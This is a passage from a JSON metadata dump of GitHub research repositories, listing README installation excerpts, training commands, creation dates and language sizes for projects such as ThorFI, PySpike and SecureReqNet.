                    "value": "The ThorFI injection agents need to be run into every Compute and Network node, according to the needs of cloud testers. These agents are REST-based applications that wait for injection requests from the ThorFI front-end agent. \nThe ThorFI front-end agent generates a __fault configuration__ to be sent to injection agents. In particular, the __fault configuration__ includes all the ``thofi_items`` and it is built upon the target virtual resource identified by the cloud tester through the ``get_network_topology`` REST API invoked by using the ThorFI dashboard or by ThorFI client.\n\nEach ``thofi_item`` describes a network interface, and it is characterized by an __ID__ (in OpenStack the port ID), a __location__ (i.e., the physical machine (Compute or Network node) that hosts the OpenStack network port), and a __type__ (e.g., tap devices, veth pairs, Linux bridges, Open vSwitch bridges, and so on). The list of all the ``thorfi_items`` constitutes the ``thorfi_item_map`` returned from the internal method ``get_thorfi_item_list_by_id_type()`` called by the REST API ``inject_RESOURCE``. After that, the REST API ``inject_RESOURCE`` invokes the ``do_injection_thorfi_item`` method that creates a mapping between the Network/Compute node IP (e.g., this info in the OpenStack implementation is kept into ``thorfi_item['binding:host_id']``) and each target network device described by the ``thorfi_item``, by also adding the information of the network namespace ID (if exists) to which the target network device belong. The structure will look like as in the following:\n\n```\n[\n    Network NODE1 IP: {\n                [\n                    netns_ID1: NIC_ID1,\n                    netns_ID2: NIC_ID2\n                ]\n    }\n    Network NODE2 IP: {\n                [\n                    netns_ID3: NIC_ID4,\n                    netns_ID4: NIC_ID5\n                ]\n    }\n    Compute NODE1 IP: {\n                [ netns_ID6: NIC_ID ]\n    }\n]\n```\n\nAfter that, the ``do_injection_thorfi_item`` method iterates over each node IP, to pass the list of target network devices to the proper injection agents listening for injection requests on that IP and a specific TCP port (by default 1234).\nInside injection agents, the method ``inject_nics()`` is responsible for actually injecting the configured fault on the target NICs. This method uses the ``ip`` Linux tool to access (if needed) the proper network namespace linked with the target physical NIC.\nFor example, assuming that the user selected a virtual router as the target for injecting a fault consisting of 100ms of delay. In the OpenStack implementation, a virtual router consists of at least two network interfaces; thus, the ``do_injection_thorfi_item`` will send two different requests to injection agents (likely targeting the same hosting Network node) with fault configuration. Besides the fault type, intensity, pattern, and injection timing, the fault target will contain two different NICs within the same network namespace ID. The ``inject_nics()`` will run two different injection commands by using both ``ip`` and ``tc`` user-space tool, as in the following:\n\n```\nip netns exec qrouter-XXX tc qdisc add dev qg-XXX root netem delay 100ms\nip netns exec qrouter-XXX tc qdisc add dev qr-YYY root netem delay 100ms\n```\n\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Injection agents",
                    "parent_header": [
                        "Installing ThorFI",
                        "Running ThorFI"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/dessertlab/thorfi/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-20T09:19:26Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-30T02:16:44Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 3822349
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 2012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 28
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "577": {
        "filename": "tuhh-softsec_code2DFD_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tuhh-softsec/code2DFD",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Before running the tool, [Python](https://www.python.org/downloads/) version 3.x and the packages specified in `requirements.txt` need to be installed.\nThe path to the application that is to be analysed can be written in the `config/config.ini` file or given as parameter (see 2.).\nA number of repositories is already given in that file, for all of which a manually created DFD exists [here](https://github.com/tuhh-softsec/microSecEnD).\nThe corresponding path only needs to be un-commented for analysis (all others have to be commented out with a \";\")\n\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Installation and configuration",
                    "parent_header": [
                        "Code2DFD"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/tuhh-softsec/code2DFD/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-04-25T12:01:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T16:04:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 420807
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 196
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "578": {
        "filename": "zemingd_Mixup4Code_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zemingd/Mixup4Code",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- pip install torch==1.4.0\n- pip install transformers==2.5.0\n- pip install filelock\n \n",
                    "original_header": "CodeBERT/GraphCodeBERT for Classification Tasks"
                },
                "confidence": 0.9999999999999645,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zemingd/Mixup4Code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```shell\ncd CodeBERT\n\npython run.py \\\n    --output_dir=./saved_models \\\n    --tokenizer_name=microsoft/codebert-base \\\n    --model_name_or_path=microsoft/codebert-base \\\n    --do_train \\\n    --num_train_epochs 50 \\\n    --block_size 256 \\\n    --train_batch_size 8 \\\n    --eval_batch_size 16 \\\n    --learning_rate 2e-5 \\\n    --max_grad_norm 1.0 \\\n    --num_labels 250 \\  # Number Classifications\n    --seed 123456  2>&1 | tee train.log\n```\n```shell\ncd GraphCodeBERT\n\npython run.py \\\n    --tokenizer_name=microsoft/graphcodebert-base \\\n    --model_name_or_path=microsoft/graphcodebert-base \\\n    --config_name microsoft/graphcodebert-base \\\n    --do_train \\\n    --num_train_epochs 50 \\\n    --code_length 384 \\\n    --data_flow_length 384 \\\n    --train_batch_size 8 \\\n    --eval_batch_size 16 \\\n    --learning_rate 2e-5 \\\n    --max_grad_norm 1.0 \\\n    --evaluate_during_training \\\n    --num_labels 250 \\  # Number Classifications\n    --seed 123456  2>&1 | tee train.log\n```\n \n",
                    "original_header": "Fine-Tune"
                },
                "confidence": 0.9999999996617248,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zemingd/Mixup4Code/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- Java250: https://developer.ibm.com/exchanges/data/all/project-codenet/\n- Python800: https://developer.ibm.com/exchanges/data/all/project-codenet/\n- Refactory: https://github.com/githubhuyang/refactory\n- CodRep: https://github.com/KTH/CodRep-competition\n \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9999999922586653,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zemingd/Mixup4Code/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-01-09T06:09:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T12:51:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 184090
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "579": {
        "filename": "ckaestne_seaibib_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ckaestne/seaibib",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Molnar, Christoph. \"[Interpretable machine learning. A Guide for Making Black Box Models Explainable](https://christophm.github.io/interpretable-ml-book/)\", 2019.  \n",
                    "original_header": "3. Debugging and Explainability Tools"
                },
                "confidence": 0.9054851969672789,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ckaestne/seaibib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> Nice project to provide tool support for Jupyter notebooks, creating dependency graphs and using static slicing to clean notebooks. \n",
                    "original_header": "14. Computational Notebooks"
                },
                "confidence": 0.9974521036194104,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ckaestne/seaibib/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Pooyan Jamschidi is teaching \"Machine Learning Systems\" a UofSC and recommended several readings to me when preparing for my course: https://pooyanjamshidi.github.io/mls/ \nAwesome Software Engineering for Machine Learning: https://github.com/SE-ML/awesome-seml \nAnnotated bibliography on ML security papers: https://berryvilleiml.com/references/\n \n",
                    "original_header": "18. Other Lists"
                },
                "confidence": 0.9701914224888379,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ckaestne/seaibib/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-31T21:14:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-03T08:23:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "580": {
        "filename": "aaghamohammadi_PUMT_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/aaghamohammadi/PUMT",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-05-07T07:20:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-10-24T18:51:50Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2001357
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "581": {
        "filename": "RedSmallPanda_SSQR_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RedSmallPanda/SSQR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-08-29T14:19:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-18T08:19:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 61982
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "582": {
        "filename": "smartyfh_CMF-CTF_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/smartyfh/CMF-CTF",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-21T23:08:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-03T03:19:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 25533
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 7464
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "583": {
        "filename": "mariomulansky_PySpike_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mariomulansky/PySpike",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "PySpike is available at Python Package Index and this is the easiest way to obtain the PySpike package.\nIf you have `pip` installed, just run\n\n.. code:: bash\n\n   sudo pip install pyspike\n\nto install pyspike.\nPySpike requires `numpy` as minimal requirement, as well as a C compiler to generate the binaries.\n\nInstall from Github sources\n...........................\n\nYou can also obtain the latest PySpike developer version from the github repository.\nFor that, make sure you have the following Python libraries installed:\n\n- numpy\n- cython\n- matplotlib (for the examples)\n- pytest (for running the tests)\n- scipy (also for the tests)\n\nIn particular, make sure that cython_ is configured properly and able to locate a C compiler, otherwise PySpike will use the much slower Python implementations.\n\nTo install PySpike, simply download the source, e.g. from Github, and run the :code:`setup.py` script:\n\n.. code:: bash\n\n    git clone https://github.com/mariomulansky/PySpike.git\n    cd PySpike\n    python setup.py build_ext --inplace\n\nThen you can run the tests using the `pytest` test framework:\n\n.. code:: bash\n\n    pytest\n\nFinally, you should make PySpike's installation folder known to Python to be able to import pyspike in your own projects.\nTherefore, add your :code:`/path/to/PySpike` to the :code:`$PYTHONPATH` environment variable.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Requirements and Installation",
                    "parent_header": [
                        "PySpike"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mariomulansky/PySpike/master/Readme.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ".. image:: https://badge.fury.io/py/pyspike.png\n    :target: http://badge.fury.io/py/pyspike\n.. image:: https://travis-ci.org/mariomulansky/PySpike.svg?branch=master\n    :target: https://travis-ci.org/mariomulansky/PySpike \nAll source codes are available on `Github <https://github.com/mariomulansky/PySpike>`_  and are published under the BSD_License_.\n \n",
                    "original_header": "PySpike"
                },
                "confidence": 0.9998112823350664,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mariomulansky/PySpike/master/Readme.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "With version 0.7.0, support for Python 2 was dropped, PySpike now officially supports\nPython 3.7, 3.8, 3.9, 3.10. \n",
                    "original_header": "Important Changelog"
                },
                "confidence": 0.9810327941427542,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mariomulansky/PySpike/master/Readme.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2014-10-10T15:28:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-24T20:26:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 217510
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cython",
                    "name": "Cython",
                    "type": "Programming_language",
                    "size": 63861
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "584": {
        "filename": "danaderp_SecureReqNet_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WM-SEMERU/SecureReqNet",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "https://wm-semeru.github.io/SecureReqNet/\n",
                    "type": "Text_excerpt",
                    "original_header": "SecureReqNet Documenation website at:",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "value": "https://colab.research.google.com/drive/1mOXvgvkqCEgrAahyUH9Bw0ZO_nLglNFq\n",
                    "type": "Text_excerpt",
                    "original_header": "\u03b1-SecureReqNet:",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`",
                        "Want to try out SecureReqNet? Checkout these examples in google colab:"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "value": "https://colab.research.google.com/github/wm-semeru/SecureReqNet/blob/master/Gamma_SecureReqNet.ipynb\n",
                    "type": "Text_excerpt",
                    "original_header": "\u0393-SecureReqNet:",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`",
                        "Want to try out SecureReqNet? Checkout these examples in google colab:"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "value": "https://colab.research.google.com/drive/1pb_QQOm0jA0SwejgqxBXKBhkuM42al4k \n",
                    "type": "Text_excerpt",
                    "original_header": "Or serve your own version:",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "value": "https://colab.research.google.com/drive/1C4D4Wvv0xW8UfoFNLM-7Bc2NxP0AISvB\n",
                    "type": "Text_excerpt",
                    "original_header": "For model interpretability:",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "value": "- [x] Using Shallow Neural Network to predict security relatedness on issues (or requirements) \n- [x] Using Deep Neural Network to predict security relatedness on issues (or requirements)\n- [ ] Using a Neural Network to predict quantitatively (regression) how critical is an issue (or requirement)\n- [ ] Implementing a Transformer Architecture to predict security criticality on issues (or requirements)\n- [ ] Recovering security related relationships among software artifacts by employing traceability theory\n\n\n*SecureReqNet* consists of a two-phase deep learning architecture that operates *(for now)* purely on the natural language descriptions of issues. The first phase of our approach learns high dimensional sentence embeddings from hundreds of thousands of descriptions extracted from software vulnerabilities listed in the CVE database and issue descriptions extracted from open source projects using an unsupervised learning process. The second phase then utilizes this semantic ontology of embeddings to train a deep convolutional neural network capable of predicting whether a given issue contains security-related information.\n\n<object data=\"https://github.com/danaderp/SecureReqNet/blob/master/data/plots/architecture.pdf\" type=\"application/pdf\" width=\"100%\"> \n</object>\n\n\n![\u03b1-SecureReqNet](https://github.com/danaderp/SecureReqNet/blob/master/data/plots/architecture-1.png)\n\n\n*SecureReqNet* has four versions that vary in terms of the size of the tensors and the parameters of the convolutional layers.\n\n\n1. **SecureReqNet (shallow)** was based on the best architecture achived by Han, et al. Such architecture implemented one convolution layer with 3 kernes of different sizes. The authors set up the size of each kernel as 1-gram, 3-gram, and 5-gram to reduce an input matrix. This matrix was built by means of an unsupervised word2vec where the rows represents the words in a given document (or issue) and the columns the size of the embedding. Details of how we trained our word2vec can be found in the notebook [*03_Clustering*](https://github.com/danaderp/SecureReqNet/blob/master/nbs/03_Clustering.ipynb).  **SecureReqNet (shallow)** has a max pooling layer followed by a flatten function. The final tensor is a merged vector from the 3 initial kernels. Unlike Han, et al.' SVM multi-class output layer, we utilized a binary classification throughout a softmax layer.\n\n\n```python\n# 1st Convolutional Layer (1-gram)\nconv_filter_1_gram = Conv2D(filters= N_filters, input_shape=input_sh, activation='relu', \n                       kernel_size=(1,embeddigs_cols), padding='valid',data_format=\"channels_last\")(gram_input)\n# 2sd Convolutional Layer (3-gram)\nconv_filter_3_gram = Conv2D(filters= N_filters, input_shape=input_sh, activation='relu', \n                       kernel_size=(3,embeddigs_cols), padding='valid')(gram_input)\n# 3rd Convolutional Layer (5-gram)\nconv_filter_5_gram = Conv2D(filters= N_filters, input_shape=input_sh, activation='relu', \n                       kernel_size=(5,embeddigs_cols), padding='valid')(gram_input)\n\n# Max Pooling Layer\nmax_pool_1_gram = MaxPooling2D(pool_size=((max_len_sentences-1+1), 1), strides=None, padding='valid')(conv_filter_1_gram)\nmax_pool_3_gram = MaxPooling2D(pool_size=((max_len_sentences-3+1), 1), strides=None, padding='valid')(conv_filter_3_gram)\nmax_pool_5_gram = MaxPooling2D(pool_size=((max_len_sentences-5+1), 1), strides=None, padding='valid')(conv_filter_5_gram)     \n\n# Fully Connected layer\nfully_connected_1_gram = Flatten()(max_pool_1_gram)\nfully_connected_3_gram = Flatten()(max_pool_3_gram)\nfully_connected_5_gram = Flatten()(max_pool_5_gram)\n\nmerged_vector = layers.concatenate([fully_connected_1_gram, fully_connected_3_gram, \n                                    fully_connected_5_gram], axis=-1)\n\nintegration_layer = Dropout(0.2)(merged_vector) # <-------- [HyperParameter]\n\npredictions = Dense(K, activation='softmax')(integration_layer)\n\n#Criticality Model\ncriticality_network = Model(inputs=[gram_input],outputs=[predictions])\n```\n\n\n2. **SecureReqNet (deep)** was an expansion of **SecureReqNet (shallow)**. We included an extra convolutional layer, a max pooling, and a flatten function. The final tensor is a merged vector from the 3 initial kernels. A fully connected sigmoid layers was added just before the binary softmax layer. \n\n\n\n3. **Alex-SecureReqNet (deep)** was based on the proposed architecture by Krizhevsky et al., where 5 convolutional layers extract the abstract features and 3 fully connected reduce the dimensionality. This is the classical convolutional ImageNet network with a small adaptation in the final layer to induce binary classification. \n\n\n4. **\u03b1-SecureReqNet (deep)** was a modification of the **Alex-SecureReqNet (deep)** in the convolutional layers. The modification consisted in implementing the n-gram kernel strategy for text-based datasets [(Han, et al., 2017)](https://ieeexplore.ieee.org/abstract/document/8094415). The input layer is a document embedding in the shape of a matrix. The first convolutional layer has a kernel of 7-gram size to reduce the input matrix into 32 vector feature maps. Later, it is applied a max pooling and a flatten function to obtain a column matrix. The second convolutional layer has a 5-gram filter followed by a max pooling and flatten function that merged 64 features. The third, fourth, and fifth convolutional layers are very similar to the original distribution in ImageNet but using 3-gram filters and 128/64 features respectively. Three fully connected layers went after the fifth conv layer to reduce the dimensionality and control the overfitting with the dropout units. The final layer is again a binary softmax layer (security vs non-security related).\n\n\n```python\n# 1st Convolutional Layer Convolutional Layer (7-gram)\nconv_1_layer = Conv2D(filters=32, input_shape=input_sh, activation='relu', \n                      kernel_size=(7,embeddigs_cols), padding='valid')(gram_input)\n# Max Pooling \nmax_1_pooling = MaxPooling2D(pool_size=((max_len_sentences-7+1),1), strides=None, padding='valid')(conv_1_layer)\n\n# Fully Connected layer\nfully_connected_1_gram = Flatten()(max_1_pooling)\nfully_connected_1_gram = Reshape((32, 1, 1))(fully_connected_1_gram)\n\n# 2nd Convolutional Layer (5-gram)\nconv_2_layer = Conv2D(filters=64, kernel_size=(5,1), activation='relu', \n                      padding='valid')(fully_connected_1_gram)\n                      \nmax_2_pooling = MaxPooling2D(pool_size=((32-5+1),1), strides=None, padding='valid')(conv_2_layer)  \n\n# Fully Connected layer\nfully_connected_2_gram = Flatten()(max_2_pooling)\nfully_connected_2_gram = Reshape((64, 1, 1))(fully_connected_2_gram)\n\n# 3rd Convolutional Layer (3-gram)\nconv_3_layer =  Conv2D(filters=128, kernel_size=(3,1), activation='relu', \n                      padding='valid')(fully_connected_2_gram)\n                      \n# 4th Convolutional Layer (3-gram)\nconv_4_layer = Conv2D(filters=128, kernel_size=(3,1), activation='relu', \n                     padding='valid')(conv_3_layer)\n                     \n# 5th Convolutional Layer (3-gram)\nconv_5_layer = Conv2D(filters=64, kernel_size=(3,1), activation='relu', \n                     padding='valid')(conv_4_layer)\n                     \n# Max Pooling\nmax_5_pooling = MaxPooling2D(pool_size=(58,1), strides=None, padding='valid')(conv_5_layer)  \n\n# Fully Connected layer\nfully_connected = Flatten()(max_5_pooling)\n\n# 1st Fully Connected Layer\ndeep_dense_1_layer = Dense(32, activation='relu')(fully_connected)\ndeep_dense_1_layer = Dropout(0.2)(deep_dense_1_layer) # <-------- [HyperParameter]\n\n# 2nd Fully Connected Layer\ndeep_dense_2_layer = Dense(32, activation='relu')(deep_dense_1_layer)\ndeep_dense_2_layer = Dropout(0.2)(deep_dense_2_layer) # <-------- [HyperParameter]\n\n# 3rd Fully Connected Layer\ndeep_dense_3_layer = Dense(16, activation='relu')(deep_dense_2_layer)\ndeep_dense_3_layer = Dropout(0.2)(deep_dense_3_layer) # <-------- [HyperParameter]\n\npredictions = Dense(K, activation='softmax')(deep_dense_3_layer)\n\n#Criticality Model\ncriticality_network = Model(inputs=[gram_input],outputs=[predictions])\n```\n\n\n> If you are using **\u03b1-SecureReqNet**, please consider citing [(N. Palacio, et al., 2019)](https://arxiv.org/abs/1908.00614)\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Research and Components Roadmap",
                    "parent_header": [
                        "SecureReqNet",
                        "Install with `pip install securereqnet`"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Dataset Source | Embedding | Training | Validation | Testing |\n--- | --- | --- | --- | --- |\nCVE Database | 52908 | 37036 | 10582 | - |\nGitLab Issues (SR) | 578 | 405 | 116 | 58 |\nGitLab Issues (Non-SR) | 578 | 405 | 116 | 58 |\nGitHub Issues (SR) | 4575 | 3203 | 915 | 458 |\nGitHub Issues (Non-SR) | 47483 | 33238 | 9497 | 458 |\nWikipedia | 10000 | - | - | - | \n",
                    "original_header": "Datasets"
                },
                "confidence": 0.9161591874421884,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/danaderp/SecureReqNet/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-07-27T22:26:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-04-08T19:17:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 13629012
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 87875
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 812
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 465
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 186
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "585": {
        "filename": "PrivacyEngineering_hawk-service_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/PrivacyEngineering/hawk-service",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "For the Hawk Service to run you need to its mandatory to have a PostgreSQL Database connected. With\nsmaller workloads Postgres itself is fine, for bigger workloads you might need some technologies\nlike [YugabyteDB](https://github.com/yugabyte/yugabyte-db). Just pass the following environment\nvariables:\n\n```properties\nSPRING_DATASOURCE_URL=jdbc:postgresql://localhost/hawk\nSPRING_DATASOURCE_USERNAME=xxxx\nSPRING_DATASOURCE_PASSWORD=xxxx\n```\n\nProfiles can be activated using the following environment variable.\n\n```\nSPRING_PROFILES_ACTIVE=flagger-canary,test-data\n```\n\nBy default, the service starts on port 8080. Pass the env `SERVER_PORT` to change that.\n\nTo install via. Docker run the following command and pass the environment variables after using you\nneed:\n\n```\ndocker run -p 8080:8080 -e ENV1=1 ENV2=2 p4skal/hawk-service\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Hawk Service"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/hawk-service/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "When the Spring Profile `flagger-canary` is active and the current environment is a Kubernetes\nenvironment this services uses\nthe [Fabric8 Kubernetes Client](https://github.com/fabric8io/kubernetes-client) to watch for new\n[Flagger Canary Releases](https://github.com/fluxcd/flagger). Recent and active releases are\navailable at the `/api/release/*` endpoints. \n",
                    "original_header": "Hawk Release"
                },
                "confidence": 0.9735749224916153,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/PrivacyEngineering/hawk-service/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
